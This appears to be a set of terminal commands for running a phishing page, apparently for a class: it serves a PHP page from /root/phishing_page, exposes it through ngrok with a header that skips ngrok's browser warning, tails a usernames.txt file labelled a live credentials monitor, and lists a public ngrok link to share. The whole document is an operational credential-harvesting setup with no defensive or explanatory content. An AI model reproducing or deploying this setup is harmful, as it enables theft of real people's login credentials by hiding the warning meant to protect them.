# ========================================
# TERMINAL 1 - PHP Server
# ========================================
cd /root/phishing_page
php -S 0.0.0.0:8080

# ========================================
# TERMINAL 2 - Ngrok
# ========================================
ngrok http 8080 --request-header-add "ngrok-skip-browser-warning: true"

# ========================================
# TERMINAL 3 - Live Credentials Monitor
# ========================================
tail -f /root/phishing_page/usernames.txt

# ========================================
# CLASS LINK (Terminal 2 se copy karo)
# ========================================
https://reformist-handed-trapping.ngrok-free.dev